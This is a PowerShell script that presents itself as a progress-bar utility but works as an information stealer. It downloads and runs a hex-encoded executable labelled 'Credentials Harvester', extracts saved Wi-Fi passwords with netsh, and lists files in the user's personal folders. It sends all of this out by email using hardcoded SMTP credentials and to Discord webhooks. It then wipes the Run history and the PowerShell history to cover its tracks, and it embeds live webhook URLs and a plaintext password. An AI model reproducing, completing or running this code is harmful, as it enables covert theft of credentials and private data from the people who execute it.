# # Add a reference to System.Windows.Forms
# Add-Type -AssemblyName System.Windows.Forms

# # Function to check for internet connection
# function Test-InternetConnection {
#     try {
#         # Attempt to ping a reliable website
#         $response = Test-Connection -ComputerName 'google.com' -Count 1 -ErrorAction Stop
#         return $true
#     } catch {
#         return $false
#     }
# }

# # Wait until an internet connection is available
# while (-not (Test-InternetConnection)) {
#     Write-Host "No internet connection. Waiting..."
#     [System.Windows.Forms.MessageBox]::Show("You are not connected to the internet.", "No internet connection. Waiting...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
#     Start-Sleep -Seconds 1  # Wait for 5 seconds before retrying
# }

# # Show a message box indicating connection status
# [System.Windows.Forms.MessageBox]::Show("You are connected to the internet.", "Connection Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)

# Script with 5 operations with progress bar

$global:isEmailSent = $false

# Function to change the boolean value
function SetEmailSentTrue {
    $global:isEmailSent = $true
    Write-Host "Inside function: isEmailSent = $isEmailSent"
}

# Function to set the boolean value to false
function SetEmailSentFalse {
    $global:isEmailSent = $false
    Write-Host "Inside SetEmailSentFalse function: isEmailSent = $isEmailSent"
}

# Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'

# ##############################################################################

# Redirect both standard output and error to null
$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append

###############################################################################

# Load the WPF assembly
Add-Type -AssemblyName PresentationFramework

# Detect if the system theme is dark or light by reading registry value
$themeKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
$themeValue = Get-ItemProperty -Path $themeKeyPath -Name "AppsUseLightTheme" -ErrorAction SilentlyContinue

# Default to Light theme if the registry key does not exist
$isDarkTheme = ($themeValue.AppsUseLightTheme -eq 0)

# Create a new WPF Window
$window = New-Object System.Windows.Window
$window.Title = "Custom Progress Bar"
$window.Width = 400
$window.Height = 30
$window.WindowStartupLocation = "Manual"
$window.Topmost = $true  # Keep on top of other windows

# Make the window transparent
$window.AllowsTransparency = $true
$window.WindowStyle = [System.Windows.WindowStyle]::None
$window.Background = [System.Windows.Media.Brushes]::Transparent

# Calculate screen and taskbar dimensions
$screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight
$screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
$taskbarHeight = $screenHeight - [System.Windows.SystemParameters]::WorkArea.Height

# Position the window above the taskbar
$window.Left = 0
$window.Top = $screenHeight - $taskbarHeight - $window.Height
$window.Width = $screenWidth

# Create a Grid to hold the UI elements
$grid = New-Object System.Windows.Controls.Grid

# Define ProgressBar style
$progressBar = New-Object System.Windows.Controls.ProgressBar
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Value = 0
$progressBar.Height = 20
$progressBar.Width = 300
$progressBar.HorizontalAlignment = 'Right'  # Align to the left
$progressBar.Margin = [System.Windows.Thickness]::new(0,0,10,10)  # Adjust left margin as needed

# Set ProgressBar color based on the system theme
if ($isDarkTheme) {
    # Dark theme colors
    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
    $gradientStop1 = New-Object System.Windows.Media.GradientStop
    $gradientStop1.Color = [System.Windows.Media.Colors]::DarkGray
    $gradientStop1.Offset = 0.0
    $gradientBrush.GradientStops.Add($gradientStop1)

    $gradientStop2 = New-Object System.Windows.Media.GradientStop
    $gradientStop2.Color = [System.Windows.Media.Colors]::Gray
    $gradientStop2.Offset = 1.0
    $gradientBrush.GradientStops.Add($gradientStop2)

    $progressBar.Foreground = $gradientBrush
} else {
    # Light theme colors
    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
    $gradientStop1 = New-Object System.Windows.Media.GradientStop
    $gradientStop1.Color = [System.Windows.Media.Colors]::LightGreen
    $gradientStop1.Offset = 0.0
    $gradientBrush.GradientStops.Add($gradientStop1)

    $gradientStop2 = New-Object System.Windows.Media.GradientStop
    $gradientStop2.Color = [System.Windows.Media.Colors]::Green
    $gradientStop2.Offset = 1.0
    $gradientBrush.GradientStops.Add($gradientStop2)

    $progressBar.Foreground = $gradientBrush
}

# Set the background color of the ProgressBar
$progressBar.Background = [System.Windows.Media.Brushes]::LightGray

# Add ProgressBar to the Grid
$grid.Children.Add($progressBar)

# Create a TextBlock for the completion notification
$textBlock = New-Object System.Windows.Controls.TextBlock
$textBlock.Text = "Starting operations..."
$textBlock.HorizontalAlignment = 'Right'
$textBlock.Margin = [System.Windows.Thickness]::new(0, 0, 10, 10)
$textBlock.FontSize = 12
$textBlock.Foreground = [System.Windows.Media.Brushes]::White

# Add TextBlock to the Grid
$grid.Children.Add($textBlock)

# Set the Grid as the Content of the Window
$window.Content = $grid

# Show the window
$window.Show()

# Define the total number of tasks (replace with the number of main operations)
$totalSteps = 4  # Adjust this to the number of main operations you want to track

# Get the current date and time
$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"  # You can adjust the format as needed

$isEmailSent = $false

# Send Email Function
function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "jiead0128@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [string[]]$Attachments = @(),  # Optional parameter for attachments
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"

    # Create the email message
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    # Attach files if provided
    foreach ($attachmentPath in $Attachments) {
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "Warning: File not found - $attachmentPath"
        }
    }

    # Configure the SMTP client
    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true  # Enables STARTTLS
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    # Send the email
    try {
        Write-Host "Sending Email.... please wait..."
        $smtpClient.Send($mailMessage)
        # Write-Host "Email sent successfully to $ToEmail." + $Subject
        $message = "Email sent successfully to $toEmail. " + $Subject
        # Send the webhook notification
        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
        SetEmailSentTrue
    } catch {
        Write-Host "Error: $_"
        SetEmailSentFalse
    } finally {
        # Clean up attachments and mail message
        foreach ($attachment in $mailMessage.Attachments) {
            $attachment.Dispose()
        }
        $mailMessage.Dispose()
    }
}

# Email Sent Notif to Webhook
function Send-EmailNotification {
    param (
        [string]$ToEmail,
        [string]$WebhookUrl,
        [string]$Message
    )

    # Create the payload
    $payload = @{
        content = $Message
    } | ConvertTo-Json

    # Send the webhook notification
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
        Write-Host "Webhook notification sent successfully."
    } catch {
        Write-Host "Error sending webhook notification: $_"
    }
}


# Example operations (replace with your actual code)
for ($step = 1; $step -le $totalSteps; $step++) {
    # Perform your operation here
    switch ($step) {

        1 {
            # Run WBPV 
            $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
            $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
            Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

            ###############################################################################

            # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY

            $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
            $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

            # Convert the hex string to a byte array
            $bytes = [byte[]]::new($hexString.Length / 2)
            for ($i = 0; $i -lt $hexString.Length; $i += 2) {
                $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
            }

            # Create a temporary file to hold the executable
            $tempExePath = Join-Path $env:TEMP "example.exe"
            [System.IO.File]::WriteAllBytes($tempExePath, $bytes)

            $process = Start-Process $tempExePath # Start the executable

            Write-Output "Operation " + $step + "/" + $totalSteps + "WBPV is running"

            ###############################################################################

            #  SAVED DATA 
            $outputFilePath = "$env:TEMP\data.txt"
            Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
            Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

            # Simulate CTRL+A and then CTRL+S to save the file
            [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
            Start-Sleep -Milliseconds 500  # Wait a moment for selection
            [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
            Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

            # Send the output file path and Enter
            [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
            Start-Sleep -Milliseconds 500  # Wait for the input
            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

            Start-Sleep -Seconds 2 # Wait a moment for the file to save
            Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

            Write-Output "Operation " + $step + "/" + $totalSteps + "WBPV saved the data."

            ###############################################################################

            # SEND to EMAIL or WEBHOOK
            # Check if the email was sent
            if (-not $isEmailSent) {

                 # Email parameters
                 $subject = "Credentials Harvester - Sent on $currentDateTime"
                 $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
 
                 # Send the email
                 Send-ZohoEmail -Subject $subject -Attachments $attachments         

                if (-not $isEmailSent) { 
                    $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable

                    if (Test-Path $filePath) {
                        # Read the content of the text file
                        $fileContent = Get-Content -Path $filePath -Raw
    
                        # Split the content into chunks of 2000 characters
                        $chunkSize = 2000
                        $chunks = [System.Collections.Generic.List[string]]::new()
    
                        for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                            $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                        }
    
                        # Calculate total chunks for progress increment
                        $totalChunks = $chunks.Count
                        $currentChunks = 1
    
                        # Send each chunk to the Discord webhook
                        foreach ($chunk in $chunks) {
                            # Create the payload for the webhook
                            $payload = @{
                                content = $chunk
                            } | ConvertTo-Json
    
                            # Try to send the content to the Discord webhook
                            try {
                                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
                                Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                            } catch {
                                Write-Host "Error sending request: $_"
                                # Add-Type -AssemblyName PresentationFramework
                                # [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
                            }
    
                            # Inside the foreach loop, after each chunk is sent
                            # Update progress bar value
                            $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                            $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
    
                            # Update the window to keep it responsive
                            [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
    
                            # Increment to the next profile
                            $currentChunks++
                            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                        }
                    } else {
                        Write-Host "File not found: $filePath"
                        Add-Type -AssemblyName PresentationFramework
                        [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
                    }
                }

                Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
                Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
                Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
                Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue

                Write-Host "Operation $step / $totalSteps is done."
                $textBlock.Text = "Operation $step / $totalSteps is done."

                SetEmailSentFalse
            }
        }
        2 {
            #FOR TESTING
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
            try {
                # Define output file path in %temp%
                $outputFile = Join-Path -Path $env:TEMP -ChildPath "wyfi.txt"

                # Initialize output file
                "" | Set-Content -Path $outputFile

                # Retrieve Wifi Profiles
                $profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
                $profileCount = $profiles.Count
                $currentProfile = 1

                foreach ($profile in $profiles) {
                    $wlan = $profile.Matches.Value

                    # Extract the Wi-Fi password
                    try {
                        $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
                    } catch {
                        Write-Host "Failed to retrieve password for $wlan"
                        $passw = "N/A" # Assign a placeholder if password retrieval fails
                    }

                    # Format profile and password information
                    $outputText = "Profile: $wlan`nPassword: $passw`n`n"

                    # Append profile and password information to the output file
                    Add-Content -Path $outputFile -Value $outputText

                    # file saved
                }
                
                Write-Host "Wyfi has been saved!"

                if (-not $isEmailsent) {

                    # Email parameters
                    $subject = "Netsh Profiles - Sent on $currentDateTime"
                    $attachments = @("$env:TEMP\wyfi.txt")  # Array of attachment file paths

                    # Send the email
                    Send-ZohoEmail -Subject $subject -Attachments $attachments

                    if (-not $isEmailsent) {
                        foreach ($profile in $profiles) {
                            $wlan = $profile.Matches.Value
                            
                            # Extract the Wi-Fi password
                            try {
                                $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
                            } catch {
                                Write-Host "Failed to retrieve password for $wlan"
                                $passw = "N/A" # Assign a placeholder if password retrieval fails
                            }
                    
                            # Build the message body for the webhook
                            $Body = @{
                                'username' = $env:username + " | " + [string]$wlan
                                'content'  = [string]$passw
                            }
                    
                            # Send the data to the Discord webhook
                            try {
                                Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
                                Write-Host "Sending to Captain hook"
                            } catch {
                                Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
                            }
        
                            # Update progress bar value
                            $progressBar.Value = [math]::Floor(($currentProfile / $profileCount) * 100)
                            $textBlock.Text = "Wehfigh Operation " + $step + "/" +$totalSteps+ ": Profile - " + $currentProfile + "/" + $profileCount
        
                            # Update the window to keep it responsive
                            [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
        
                            # Increment to the next profile
                            $currentProfile++
                            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                        }

                    }
                }
            } catch {
                Write-Host "An error occurred: $($_.Exception.Message)"
                # Add-Type -AssemblyName PresentationFramework
                # [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
            }
            Remove-Item "$env:TEMP\wyfi.txt" -Force -ErrorAction SilentlyContinue
            $textBlock.Text = "Operation $step is done. " 
            SetEmailSentFalse
        }
        3 {
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
            #TREE Files Extract
            # Define the folders to search
            $folders = @(
                [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Documents'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Music')
            )
    
            # Define the output file path
            $outputFile = [System.IO.Path]::Combine($env:TEMP, 'tree.txt')
    
            # Function to display files in a tree structure
            function Show-Tree {
                param (
                    [string]$Path,
                    [int]$Depth = 0
                )
                
                # Get all directories and files in the current path
                $items = Get-ChildItem -Path $Path -ErrorAction SilentlyContinue
    
                foreach ($item in $items) {
                    # Exclude Program Files and OS files
                    if ($item.FullName -notlike "*\Program Files\*" -and 
                        $item.FullName -notlike "*\Windows\*" -and 
                        $item.FullName -notlike "*\System32\*") {
    
                        # Indent based on depth
                        $indent = ' ' * ($Depth * 4)
    
                        # Display the item
                        if ($item.PSIsContainer) {
                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
                            # Recurse into the directory
                            Show-Tree -Path $item.FullName -Depth ($Depth + 1)
                        } else {
                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
                        }
                    }
                }
            }
    
            # Clear the output file if it already exists
            if (Test-Path $outputFile) {
                Remove-Item $outputFile
            }
    
            # Iterate through defined folders and display their contents
            foreach ($folder in $folders) {
                "Contents of ${folder}:" | Out-File -Append -FilePath $outputFile
                Show-Tree -Path $folder
                "" | Out-File -Append -FilePath $outputFile
            }

            #################################################

            if (-not $isEmailSent) { 

                # Email parameters
                $subject = "Tree Filenames - Sent on $currentDateTime"
                $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths

                # Send the email
                Send-ZohoEmail -Subject $subject -Attachments $attachments
                
                if (-not $isEmailSent) { 
                    $filePath = "$env:TEMP\tree.txt"
        
                    # Check if the file exists
                    if (Test-Path $filePath) {
                        # Read the content of the text file
                        $fileContent = Get-Content -Path $filePath -Raw
            
                        # Check the length of the file content
                        if ($fileContent.Length -lt 2000) {
                            # Send the entire content to the Discord webhook
                            $payload = @{
                                content = $fileContent
                            } | ConvertTo-Json
                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                            $progressBar.Value = 100  # Set progress to complete

                        } else {
                            # Split the content into chunks of 2000 characters
                            $chunkSize = 2000
                            $chunks = [System.Collections.Generic.List[string]]::new()
            
                            for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                                $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                            }

                            # Calculate total chunks for progress increment
                            $totalChunks = $chunks.Count
                            $currentChunks = 1
            
                            # Send each chunk to the Discord webhook
                            foreach ($chunk in $chunks) {
                                # Create the payload for the webhook
                                $payload = @{
                                    content = $chunk
                                } | ConvertTo-Json
            
                                # Try to send the content to the Discord webhook
                                try {
                                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                                    Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                                } catch {
                                    Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
                                }

                                # Update progress bar value
                                $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                                $textBlock.Text = "Operation " + $step + "/" + $totalSteps + ": Tree Chunks - " + $currentChunks + "/" + $totalChunks

                                # Update the window to keep it responsive
                                [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)

                                # Increment to the next profile
                                $currentChunks++
                                Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                            }
                            Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                        }
                    } else {
                        Write-Host "File not found: $filePath"
                        Add-Type -AssemblyName PresentationFramework
                        [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
                    }
                    $isEmailSent = $false
                }
            }

            Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
    
            #delete the entire history
            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
            # Clear the PowerShell command history
            Clear-History

            SetEmailSentFalse
        }
        4 {
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
            # Define the webhook URL
            $logs_webhookUrl='https://discord.com/api/webhooks/1300717354547806219/1JCd4_69saQaBJrxNJJbDn-oC_VKJDj_-UYfn8tC3qu1hAzsgetWQ00cPOcHoTcmANhL'

            #SEND THE LOG FILE
            # Define the path to the text file using the TEMP environment variable
            $filePath = "$env:TEMP\Ain1_log.txt"

            $tempPath = [System.IO.Path]::GetTempPath()
            $sourceFile = Join-Path -Path $tempPath -ChildPath "Ain1_log.txt"
            $destinationFile = Join-Path -Path $tempPath -ChildPath "Ain1_log_copy.txt"

            Copy-Item -Path $sourceFile -Destination $destinationFile

            # Check if the email was sent
            if (-not $isEmailSent) {
                # Email parameters
                $subject = "Operation Logs  - Sent on $currentDateTime"
                $attachments = @("$env:TEMP\Ain1_log_copy.txt")  # Array of attachment file paths
                
                # Send the email
                Send-ZohoEmail -Subject $subject -Attachments $attachments

                # Check if the email was sent
                if (-not $isEmailSent) {
                    if (Test-Path $filePath) {
                        # Read the content of the text file
                        $fileContent = Get-Content -Path $filePath -Raw
            
                        # Check the length of the file content
                        if ($fileContent.Length -lt 2000) {
                            # Send the entire content to the Discord webhook
                            $payload = @{
                                content = $fileContent
                            } | ConvertTo-Json -Depth 10
                            Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                            $progressBar.Value = 100  # Set progress to complete
                        } else {
                            # Split the content into chunks of 2000 characters
                            $chunkSize = 2000
                            $chunks = [System.Collections.Generic.List[string]]::new()
            
                            for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                                $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                            }
    
                            # Calculate total chunks for progress increment
                            $totalChunks = $chunks.Count
                            $currentChunks = 1
            
                            # Send each chunk to the Discord webhook
                            foreach ($chunk in $chunks) {
                                # Create the payload for the webhook
                                $payload = @{
                                    content = $chunk
                                } | ConvertTo-Json -Depth 10
            
                                # Try to send the content to the Discord webhook
                                try {
                                    Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                                    Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                                } catch {
                                    Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
                                }
    
                                # Update progress bar value
                                $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                                $textBlock.Text = "Log Operation " + $step + "/" + $totalSteps + ": Log Chunks - " + $currentChunks + "/" + $totalChunks
    
                                # Update the window to keep it responsive
                                [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
    
                                # Increment to the next profile
                                $currentChunks++
                                Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                            }
                            Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                        }
                    } else {
                        Write-Host "File not found: $filePath"
                        Add-Type -AssemblyName PresentationFramework
                        [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
                    }
                    $isEmailSent = $false
                }
            }
            $textBlock.Text = "Log sent!"
            # Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
            # Remove-Item "$env:TEMP\Ain1_log_copy.txt" -Force -ErrorAction SilentlyContinue


            #delete the entire history
            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
            # Clear the PowerShell command history
            Clear-History

            SetEmailSentFalse
        }
    }
    # Update the progress bar
    $progressBar.Value = ($step / $totalSteps) * 100

    # Update the window to keep it responsive
    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
}

# Close the window upon completion
$window.Close()

# End the transcript if you started one
Stop-Transcript

# Final output (if needed)
Write-Output "All operations completed!"
# Display a message box indicating completion

Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Ain1_log_copy.txt" -Force -ErrorAction SilentlyContinue

# Add-Type -AssemblyName PresentationFramework
# [System.Windows.MessageBox]::Show("All operations completed!", "Success", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)